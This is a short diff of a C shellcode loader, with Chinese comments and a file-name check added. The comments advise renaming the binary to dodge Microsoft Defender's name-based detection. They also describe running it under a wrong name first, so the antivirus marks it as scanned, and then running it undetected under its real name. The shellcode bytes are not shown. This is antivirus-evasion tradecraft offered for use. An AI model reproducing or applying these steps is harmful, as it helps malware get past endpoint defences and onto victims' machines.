@@ -3,9 +3,12 @@
 
 
 /*
+* 
 * 注意事项：
 *
-* 1. 经多次测试发现，Defender有根据名称判断文件是否恶意的倾向，因此使用前务必将文件名修改
+* 1. 经多次测试发现，Defender有根据名称判断文件是否恶意的倾向，因此使用前务必将文件名修改。
+* 2. 可以在存在文件名称检测保护的前提下，将文件改为错误的名称，然后主动运行，
+*		诱骗杀软进行一次检测，文件将会被标记为已扫描状态，此后以正确名称运行将不会受到检测。
 *
 */
 
@@ -42,6 +45,7 @@ __declspec(allocate(".text")) BYTE Shellcode[] = {
 
 int _tmain(int argc, TCHAR* argv[])
 {
+	// 文件名称检测
 	TCHAR FileName[MAX_PATH];
 	_tsplitpath_s(argv[0], NULL, 0, NULL, 0, FileName, sizeof(FileName), NULL, 0);
 
